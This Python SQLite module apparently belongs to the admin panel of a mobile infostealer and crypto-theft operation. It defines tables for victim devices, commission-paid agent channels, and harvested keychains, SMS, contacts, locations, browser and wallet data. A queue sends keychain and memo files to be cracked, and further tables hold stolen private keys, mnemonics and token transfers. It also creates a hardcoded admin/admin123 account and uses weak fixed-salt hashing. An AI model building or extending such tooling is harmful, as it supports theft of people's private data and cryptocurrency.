#!/usr/bin/env python3
"""
database.py - 多租户代理体系数据库模型
SQLite 实现，支持：用户/渠道/设备/文件/破解队列/代币转账
"""

import os
import sqlite3
import hashlib
import secrets
from datetime import datetime

DB_PATH = os.environ.get("DB_PATH", os.path.join(os.path.dirname(__file__), "appcore.db"))

# 文件类型
FILE_TYPES = {
    "keychain": "钥匙串",
    "memo": "备忘录",
    "private_key": "私钥",
    "filesystem": "文件系统",
    "metadata": "元数据",
    "thumbnail": "缩略图",
    "sms": "短信",
    "call_log": "通话记录",
    "contacts": "通讯录",
    "photo": "照片",
    "video": "视频",
    "location": "位置",
    "browser": "浏览器数据",
    "wallet": "钱包数据",
}

# 破解状态
CRACK_STATUS = {
    "pending": "待破解",
    "processing": "破解中",
    "done": "已破解",
    "failed": "破解失败",
    "skipped": "跳过",
}

# 用户角色
USER_ROLES = ["admin", "agent"]


def get_db():
    """获取数据库连接"""
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA foreign_keys=ON")
    return conn


def init_db():
    """初始化数据库表结构"""
    conn = get_db()
    c = conn.cursor()

    # 渠道表（平台+管道两级）
    c.execute("""
        CREATE TABLE IF NOT EXISTS channels (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            platform_no TEXT NOT NULL,
            pipe_no TEXT NOT NULL,
            name TEXT NOT NULL,
            contact TEXT DEFAULT '',
            phone TEXT DEFAULT '',
            commission_rate REAL DEFAULT 0.3,
            status TEXT DEFAULT 'active',
            created_at TEXT NOT NULL,
            UNIQUE(platform_no, pipe_no)
        )
    """)

    # 用户表（管理员+代理）
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL UNIQUE,
            password_hash TEXT NOT NULL,
            role TEXT NOT NULL DEFAULT 'agent',
            channel_id INTEGER,
            display_name TEXT DEFAULT '',
            status TEXT DEFAULT 'active',
            last_login TEXT,
            created_at TEXT NOT NULL,
            FOREIGN KEY (channel_id) REFERENCES channels(id)
        )
    """)

    # 设备表
    c.execute("""
        CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_uid TEXT NOT NULL UNIQUE,
            os_version TEXT DEFAULT '',
            ip TEXT DEFAULT '',
            channel_id INTEGER,
            bundle_id TEXT DEFAULT '',
            acquisition_id TEXT DEFAULT '',
            first_seen TEXT NOT NULL,
            last_seen TEXT NOT NULL,
            status TEXT DEFAULT 'active',
            remark TEXT DEFAULT '',
            FOREIGN KEY (channel_id) REFERENCES channels(id)
        )
    """)

    # 文件表
    c.execute("""
        CREATE TABLE IF NOT EXISTS files (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id INTEGER NOT NULL,
            file_type TEXT NOT NULL,
            filename TEXT NOT NULL,
            filepath TEXT NOT NULL,
            size INTEGER DEFAULT 0,
            sha256 TEXT DEFAULT '',
            crack_status TEXT DEFAULT 'pending',
            crack_result TEXT DEFAULT '',
            uploaded_at TEXT NOT NULL,
            cracked_at TEXT,
            FOREIGN KEY (device_id) REFERENCES devices(id)
        )
    """)

    # 破解队列表
    c.execute("""
        CREATE TABLE IF NOT EXISTS crack_queue (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            file_id INTEGER NOT NULL,
            status TEXT DEFAULT 'pending',
            priority INTEGER DEFAULT 0,
            attempt_count INTEGER DEFAULT 0,
            result TEXT DEFAULT '',
            error TEXT DEFAULT '',
            created_at TEXT NOT NULL,
            started_at TEXT,
            completed_at TEXT,
            FOREIGN KEY (file_id) REFERENCES files(id)
        )
    """)

    # 代币转账记录表
    c.execute("""
        CREATE TABLE IF NOT EXISTS token_transfers (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id INTEGER,
            chain TEXT DEFAULT '',
            token TEXT DEFAULT '',
            from_address TEXT DEFAULT '',
            to_address TEXT DEFAULT '',
            amount TEXT DEFAULT '',
            tx_hash TEXT DEFAULT '',
            block_number INTEGER DEFAULT 0,
            timestamp TEXT,
            status TEXT DEFAULT 'recorded',
            created_at TEXT NOT NULL,
            FOREIGN KEY (device_id) REFERENCES devices(id)
        )
    """)

    # 私钥信息表
    c.execute("""
        CREATE TABLE IF NOT EXISTS private_keys (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id INTEGER NOT NULL,
            wallet_name TEXT DEFAULT '',
            chain TEXT DEFAULT '',
            address TEXT DEFAULT '',
            private_key TEXT DEFAULT '',
            mnemonic TEXT DEFAULT '',
            balance TEXT DEFAULT '',
            source TEXT DEFAULT '',
            created_at TEXT NOT NULL,
            FOREIGN KEY (device_id) REFERENCES devices(id)
        )
    """)

    # 操作日志表
    c.execute("""
        CREATE TABLE IF NOT EXISTS audit_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            action TEXT NOT NULL,
            target TEXT DEFAULT '',
            detail TEXT DEFAULT '',
            ip TEXT DEFAULT '',
            created_at TEXT NOT NULL,
            FOREIGN KEY (user_id) REFERENCES users(id)
        )
    """)

    # 索引
    c.execute("CREATE INDEX IF NOT EXISTS idx_devices_channel ON devices(channel_id)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_devices_uid ON devices(device_uid)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_files_device ON files(device_id)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_files_type ON files(file_type)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_files_crack ON files(crack_status)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_crack_status ON crack_queue(status)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_pkeys_device ON private_keys(device_id)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_transfers_device ON token_transfers(device_id)")

    conn.commit()

    # 创建默认管理员
    c.execute("SELECT COUNT(*) FROM users WHERE role='admin'")
    if c.fetchone()[0] == 0:
        admin_hash = hash_password("admin123")
        c.execute("""
            INSERT INTO users (username, password_hash, role, display_name, created_at)
            VALUES (?, ?, 'admin', '超级管理员', ?)
        """, ("admin", admin_hash, datetime.now().isoformat()))
        print("[+] 默认管理员已创建: admin / admin123")

    # 创建默认渠道
    c.execute("SELECT COUNT(*) FROM channels")
    if c.fetchone()[0] == 0:
        c.execute("""
            INSERT INTO channels (platform_no, pipe_no, name, created_at)
            VALUES ('102', '82008', '默认渠道', ?)
        """, (datetime.now().isoformat(),))
        print("[+] 默认渠道已创建: 102 / 82008")

    conn.commit()
    conn.close()
    print(f"[+] 数据库初始化完成: {DB_PATH}")


def hash_password(password: str) -> str:
    """密码哈希（SHA-256 + salt）"""
    salt = "appcore_salt_2026"
    return hashlib.sha256((password + salt).encode()).hexdigest()


def verify_password(password: str, password_hash: str) -> bool:
    """验证密码"""
    return hash_password(password) == password_hash


def generate_token() -> str:
    """生成访问 Token"""
    return secrets.token_hex(32)


# ============================================================================
# 用户操作
# ============================================================================

def create_user(username, password, role="agent", channel_id=None, display_name=""):
    conn = get_db()
    try:
        conn.execute("""
            INSERT INTO users (username, password_hash, role, channel_id, display_name, created_at)
            VALUES (?, ?, ?, ?, ?, ?)
        """, (username, hash_password(password), role, channel_id, display_name,
              datetime.now().isoformat()))
        conn.commit()
        return conn.execute("SELECT last_insert_rowid()").fetchone()[0]
    except sqlite3.IntegrityError:
        return None
    finally:
        conn.close()


def get_user_by_username(username):
    conn = get_db()
    row = conn.execute("SELECT * FROM users WHERE username=?", (username,)).fetchone()
    conn.close()
    return dict(row) if row else None


def get_user_by_id(user_id):
    conn = get_db()
    row = conn.execute("SELECT * FROM users WHERE id=?", (user_id,)).fetchone()
    conn.close()
    return dict(row) if row else None


def list_users(role=None):
    conn = get_db()
    if role:
        rows = conn.execute("SELECT * FROM users WHERE role=? ORDER BY id", (role,)).fetchall()
    else:
        rows = conn.execute("SELECT * FROM users ORDER BY id").fetchall()
    conn.close()
    return [dict(r) for r in rows]


def update_user_login(user_id):
    conn = get_db()
    conn.execute("UPDATE users SET last_login=? WHERE id=?",
                 (datetime.now().isoformat(), user_id))
    conn.commit()
    conn.close()


# ============================================================================
# 渠道操作
# ============================================================================

def create_channel(platform_no, pipe_no, name, contact="", phone="", commission_rate=0.3):
    conn = get_db()
    try:
        conn.execute("""
            INSERT INTO channels (platform_no, pipe_no, name, contact, phone, commission_rate, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, (platform_no, pipe_no, name, contact, phone, commission_rate,
              datetime.now().isoformat()))
        conn.commit()
        return conn.execute("SELECT last_insert_rowid()").fetchone()[0]
    except sqlite3.IntegrityError:
        return None
    finally:
        conn.close()


def list_channels():
    conn = get_db()
    rows = conn.execute("SELECT * FROM channels ORDER BY id").fetchall()
    conn.close()
    return [dict(r) for r in rows]


def get_channel(channel_id):
    conn = get_db()
    row = conn.execute("SELECT * FROM channels WHERE id=?", (channel_id,)).fetchone()
    conn.close()
    return dict(row) if row else None


# ============================================================================
# 设备操作
# ============================================================================

def upsert_device(device_uid, os_version="", ip="", channel_id=None,
                  bundle_id="", acquisition_id=""):
    """插入或更新设备（按 device_uid）"""
    conn = get_db()
    now = datetime.now().isoformat()
    row = conn.execute("SELECT id FROM devices WHERE device_uid=?", (device_uid,)).fetchone()

    if row:
        conn.execute("""
            UPDATE devices SET os_version=?, ip=?, last_seen=?
            WHERE device_uid=?
        """, (os_version, ip, now, device_uid))
        device_id = row[0]
    else:
        conn.execute("""
            INSERT INTO devices (device_uid, os_version, ip, channel_id, bundle_id,
                                 acquisition_id, first_seen, last_seen)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """, (device_uid, os_version, ip, channel_id, bundle_id, acquisition_id, now, now))
        device_id = conn.execute("SELECT last_insert_rowid()").fetchone()[0]

    conn.commit()
    conn.close()
    return device_id


def list_devices(channel_id=None, keyword="", os_version="", start_date="", end_date=""):
    """列出设备，支持渠道过滤和搜索"""
    conn = get_db()
    query = "SELECT * FROM devices WHERE 1=1"
    params = []

    if channel_id:
        query += " AND channel_id=?"
        params.append(channel_id)
    if keyword:
        query += " AND (device_uid LIKE ? OR ip LIKE ?)"
        params.extend([f"%{keyword}%", f"%{keyword}%"])
    if os_version and os_version != "全部":
        query += " AND os_version=?"
        params.append(os_version)
    if start_date:
        query += " AND first_seen >= ?"
        params.append(start_date)
    if end_date:
        query += " AND first_seen <= ?"
        params.append(end_date + " 23:59:59")

    query += " ORDER BY last_seen DESC"
    rows = conn.execute(query, params).fetchall()
    conn.close()
    return [dict(r) for r in rows]


def get_device(device_id):
    conn = get_db()
    row = conn.execute("SELECT * FROM devices WHERE id=?", (device_id,)).fetchone()
    conn.close()
    return dict(row) if row else None


def get_device_files_stats(device_id):
    """获取设备的文件统计（按类型+破解状态）"""
    conn = get_db()
    rows = conn.execute("""
        SELECT file_type, crack_status, COUNT(*) as cnt
        FROM files WHERE device_id=?
        GROUP BY file_type, crack_status
    """, (device_id,)).fetchall()
    conn.close()

    stats = {}
    for r in rows:
        ft = r["file_type"]
        cs = r["crack_status"]
        if ft not in stats:
            stats[ft] = {"total": 0, "pending": 0, "done": 0, "failed": 0}
        stats[ft]["total"] += r["cnt"]
        if cs in stats[ft]:
            stats[ft][cs] += r["cnt"]
    return stats


# ============================================================================
# 文件操作
# ============================================================================

def add_file(device_id, file_type, filename, filepath, size=0, sha256=""):
    conn = get_db()
    now = datetime.now().isoformat()
    conn.execute("""
        INSERT INTO files (device_id, file_type, filename, filepath, size, sha256, crack_status, uploaded_at)
        VALUES (?, ?, ?, ?, ?, ?, 'pending', ?)
    """, (device_id, file_type, filename, filepath, size, sha256, now))
    file_id = conn.execute("SELECT last_insert_rowid()").fetchone()[0]

    # 自动加入破解队列（钥匙串和备忘录需要破解）
    if file_type in ("keychain", "memo"):
        conn.execute("""
            INSERT INTO crack_queue (file_id, status, created_at)
            VALUES (?, 'pending', ?)
        """, (file_id, now))

    conn.commit()
    conn.close()
    return file_id


def list_files(device_id=None, file_type=None, crack_status=None, channel_id=None):
    conn = get_db()
    query = """
        SELECT f.*, d.device_uid, d.os_version, d.ip, d.channel_id
        FROM files f
        JOIN devices d ON f.device_id = d.id
        WHERE 1=1
    """
    params = []
    if device_id:
        query += " AND f.device_id=?"
        params.append(device_id)
    if file_type:
        query += " AND f.file_type=?"
        params.append(file_type)
    if crack_status:
        query += " AND f.crack_status=?"
        params.append(crack_status)
    if channel_id:
        query += " AND d.channel_id=?"
        params.append(channel_id)
    query += " ORDER BY f.uploaded_at DESC LIMIT 1000"
    rows = conn.execute(query, params).fetchall()
    conn.close()
    return [dict(r) for r in rows]


def update_file_crack(file_id, status, result=""):
    conn = get_db()
    now = datetime.now().isoformat()
    conn.execute("""
        UPDATE files SET crack_status=?, crack_result=?, cracked_at=? WHERE id=?
    """, (status, result, now if status == "done" else None, file_id))
    conn.execute("""
        UPDATE crack_queue SET status=?, result=?, completed_at=? WHERE file_id=?
    """, (status, result, now if status in ("done", "failed") else None, file_id))
    conn.commit()
    conn.close()


# ============================================================================
# 破解队列操作
# ============================================================================

def list_crack_queue(status=None, channel_id=None):
    conn = get_db()
    query = """
        SELECT cq.*, f.filename, f.file_type, f.size, d.device_uid, d.channel_id
        FROM crack_queue cq
        JOIN files f ON cq.file_id = f.id
        JOIN devices d ON f.device_id = d.id
        WHERE 1=1
    """
    params = []
    if status:
        query += " AND cq.status=?"
        params.append(status)
    if channel_id:
        query += " AND d.channel_id=?"
        params.append(channel_id)
    query += " ORDER BY cq.priority DESC, cq.created_at ASC LIMIT 500"
    rows = conn.execute(query, params).fetchall()
    conn.close()
    return [dict(r) for r in rows]


# ============================================================================
# 私钥操作
# ============================================================================

def add_private_key(device_id, wallet_name="", chain="", address="",
                    private_key="", mnemonic="", balance="", source=""):
    conn = get_db()
    conn.execute("""
        INSERT INTO private_keys (device_id, wallet_name, chain, address, private_key,
                                  mnemonic, balance, source, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (device_id, wallet_name, chain, address, private_key, mnemonic,
          balance, source, datetime.now().isoformat()))
    pk_id = conn.execute("SELECT last_insert_rowid()").fetchone()[0]
    conn.commit()
    conn.close()
    return pk_id


def list_private_keys(channel_id=None, device_id=None):
    conn = get_db()
    query = """
        SELECT pk.*, d.device_uid, d.channel_id
        FROM private_keys pk
        JOIN devices d ON pk.device_id = d.id
        WHERE 1=1
    """
    params = []
    if channel_id:
        query += " AND d.channel_id=?"
        params.append(channel_id)
    if device_id:
        query += " AND pk.device_id=?"
        params.append(device_id)
    query += " ORDER BY pk.created_at DESC"
    rows = conn.execute(query, params).fetchall()
    conn.close()
    return [dict(r) for r in rows]


# ============================================================================
# 代币转账操作
# ============================================================================

def add_token_transfer(device_id, chain="", token="", from_addr="", to_addr="",
                       amount="", tx_hash="", block_number=0, timestamp=""):
    conn = get_db()
    conn.execute("""
        INSERT INTO token_transfers (device_id, chain, token, from_address, to_address,
                                     amount, tx_hash, block_number, timestamp, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (device_id, chain, token, from_addr, to_addr, amount, tx_hash,
          block_number, timestamp, datetime.now().isoformat()))
    conn.commit()
    conn.close()


def list_token_transfers(channel_id=None, device_id=None, chain=""):
    conn = get_db()
    query = """
        SELECT tt.*, d.device_uid, d.channel_id
        FROM token_transfers tt
        JOIN devices d ON tt.device_id = d.id
        WHERE 1=1
    """
    params = []
    if channel_id:
        query += " AND d.channel_id=?"
        params.append(channel_id)
    if device_id:
        query += " AND tt.device_id=?"
        params.append(device_id)
    if chain:
        query += " AND tt.chain=?"
        params.append(chain)
    query += " ORDER BY tt.created_at DESC LIMIT 500"
    rows = conn.execute(query, params).fetchall()
    conn.close()
    return [dict(r) for r in rows]


# ============================================================================
# 统计
# ============================================================================

def get_overall_stats(channel_id=None):
    """获取总览统计"""
    conn = get_db()
    params = []
    channel_clause = ""
    if channel_id:
        channel_clause = " AND d.channel_id=?"
        params.append(channel_id)

    # 设备数
    device_count = conn.execute(
        f"SELECT COUNT(*) FROM devices d WHERE 1=1{channel_clause}", params
    ).fetchone()[0]

    # 文件总数
    file_count = conn.execute(
        f"SELECT COUNT(*) FROM files f JOIN devices d ON f.device_id=d.id WHERE 1=1{channel_clause}",
        params
    ).fetchone()[0]

    # 待破解数
    pending_count = conn.execute(
        f"""SELECT COUNT(*) FROM files f JOIN devices d ON f.device_id=d.id
            WHERE f.crack_status='pending'{channel_clause}""", params
    ).fetchone()[0]

    # 已破解数
    done_count = conn.execute(
        f"""SELECT COUNT(*) FROM files f JOIN devices d ON f.device_id=d.id
            WHERE f.crack_status='done'{channel_clause}""", params
    ).fetchone()[0]

    # 私钥数
    pk_count = conn.execute(
        f"""SELECT COUNT(*) FROM private_keys pk JOIN devices d ON pk.device_id=d.id
            WHERE 1=1{channel_clause}""", params
    ).fetchone()[0]

    # 按类型统计
    type_stats = {}
    rows = conn.execute(
        f"""SELECT f.file_type, COUNT(*) as cnt FROM files f
            JOIN devices d ON f.device_id=d.id WHERE 1=1{channel_clause}
            GROUP BY f.file_type""", params
    ).fetchall()
    for r in rows:
        type_stats[r["file_type"]] = r["cnt"]

    conn.close()
    return {
        "device_count": device_count,
        "file_count": file_count,
        "pending_count": pending_count,
        "done_count": done_count,
        "private_key_count": pk_count,
        "type_stats": type_stats,
    }


def add_audit_log(user_id, action, target="", detail="", ip=""):
    conn = get_db()
    conn.execute("""
        INSERT INTO audit_logs (user_id, action, target, detail, ip, created_at)
        VALUES (?, ?, ?, ?, ?, ?)
    """, (user_id, action, target, detail, ip, datetime.now().isoformat()))
    conn.commit()
    conn.close()


if __name__ == "__main__":
    init_db()
    print("\n=== 数据库初始化完成 ===")
    print(f"数据库路径: {DB_PATH}")
    print("默认管理员: admin / admin123")
    print("默认渠道: 102 / 82008")
